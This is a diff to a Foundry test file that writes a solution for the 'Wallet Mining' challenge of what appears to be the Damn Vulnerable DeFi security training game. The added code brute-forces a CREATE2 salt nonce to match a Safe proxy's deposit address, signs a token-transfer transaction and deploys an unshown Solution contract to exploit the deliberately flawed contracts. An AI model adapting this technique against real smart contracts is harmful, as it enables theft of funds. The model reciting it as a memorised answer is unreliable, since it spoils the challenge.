@@ -11,6 +11,7 @@ import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
 import {
     AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
 } from "../../src/wallet-mining/AuthorizerFactory.sol";
+import {Solution} from "./Solution.sol";
 
 contract WalletMiningChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -122,7 +123,42 @@ contract WalletMiningChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_walletMining() public checkSolvedByPlayer {}
+    function test_walletMining() public checkSolvedByPlayer {
+        address[] memory owners = new address[](1);
+        owners[0] = user;
+        bytes memory initializer =
+            abi.encodeCall(Safe.setup, (owners, 1, address(0), "", address(0), address(0), 0, payable(0)));
+        uint256 saltNonce;
+        address proxy;
+        // find saltnonce corresponding to USER_DEPOSIT_ADDRESS
+        while (proxy != USER_DEPOSIT_ADDRESS) {
+            ++saltNonce;
+            proxy = vm.computeCreate2Address(
+                keccak256(bytes.concat(keccak256(initializer), bytes32(saltNonce))),
+                keccak256(
+                    bytes.concat(proxyFactory.proxyCreationCode(), bytes32(uint256(uint160(address(singletonCopy)))))
+                ),
+                address(proxyFactory)
+            );
+        }
+
+        // data to make the proxy to transfer DVT
+        bytes memory data = abi.encodeCall(token.transfer, (user, DEPOSIT_TOKEN_AMOUNT));
+        // sets the Safe bytecode to the proxy,
+        // so we can call getTransactionHash to sign
+        vm.etch(proxy, type(Safe).runtimeCode);
+        bytes32 txHash = Safe(payable(proxy)).getTransactionHash(
+            address(token), 0, data, Enum.Operation.Call, 0, 0, 0, address(0), payable(0), 0
+        );
+        // remove the bytecode to deploy it in Solution
+        vm.etch(proxy, "");
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
+        bytes memory signature = bytes.concat(r, s, bytes1(v));
+
+        new Solution(
+            USER_DEPOSIT_ADDRESS, authorizer, walletDeployer, initializer, saltNonce, token, data, signature, ward
+        );
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
